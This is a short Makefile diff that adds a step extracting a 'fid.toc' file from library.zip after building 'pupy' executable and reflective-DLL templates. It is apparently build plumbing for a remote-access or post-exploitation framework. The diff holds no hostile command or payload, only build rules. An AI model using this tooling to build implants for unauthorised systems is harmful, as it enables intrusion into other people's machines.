@@ -123,9 +123,11 @@ ReflectiveLoader.obj: ReflectiveLoader.c
 
 $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe: main_exe.obj $(PYOBJS) $(COMMON_OBJS)
 	$(CC) $(CFLAGS) $+ /Fe$@ $(LINKER_OPTS)
+	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
 $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: main_reflective.obj $(PYOBJS) ReflectiveLoader.obj $(COMMON_OBJS)
 	$(CC) $(CFLAGS) $+ /Fe$@ /LD
+	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
 .PHONY: clean
 
